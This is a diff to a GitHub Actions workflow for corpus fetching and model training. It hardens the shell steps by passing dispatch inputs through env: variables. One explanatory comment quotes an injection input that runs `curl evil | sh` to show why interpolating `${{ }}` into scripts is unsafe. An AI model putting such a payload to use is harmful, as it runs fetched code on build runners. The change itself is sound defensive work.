@@ -75,12 +75,19 @@ jobs:
       # ~250KB of repository prose. This workflow had not yet fired once, so no model was actually
       # built that way — the bug was found by reading, not by a bad artifact. The step below is what
       # keeps it found.
+      #
+      # Inputs reach the shell through `env:`, never interpolated into the script. A dispatch input
+      # of `1500" ; curl evil | sh ; echo "` closes the quotes in a `${{ }}` substitution and runs;
+      # `$CORPUS_SIZE` is a shell variable and cannot. Dispatch needs write access, so this is not
+      # reachable by a stranger — it is the pattern that stops being safe the day the trigger widens.
       - name: fetch corpus
         working-directory: analysis
+        env:
+          CORPUS_SIZE: ${{ github.event.inputs.corpus_size || 1500 }}
         run: |
           python scripts/fetch_corpus.py \
             --out corpora \
-            --limit "${{ github.event.inputs.corpus_size || 1500 }}" \
+            --limit "$CORPUS_SIZE" \
             --delay 0.25
 
       # A path bug upstream of a `required: false` corpus is invisible: training succeeds, the
@@ -114,13 +121,16 @@ jobs:
       # number meaning what it says, and at 68M tokens the 5% is worth far less than the honesty.
       - name: train
         working-directory: analysis
+        env:
+          ORDER: ${{ github.event.inputs.order || 4 }}
+          MAX_SECONDS: ${{ github.event.inputs.max_seconds || 1500 }}
         run: |
           python -m adhd_analysis.text.train \
             --manifest corpora.yaml \
             --out models/background.kn.gz \
             --record models/training-record.json \
-            --order "${{ github.event.inputs.order || 4 }}" \
-            --max-seconds "${{ github.event.inputs.max_seconds || 1500 }}" \
+            --order "$ORDER" \
+            --max-seconds "$MAX_SECONDS" \
             --held-out-every 20 \
             --min-count 2
 
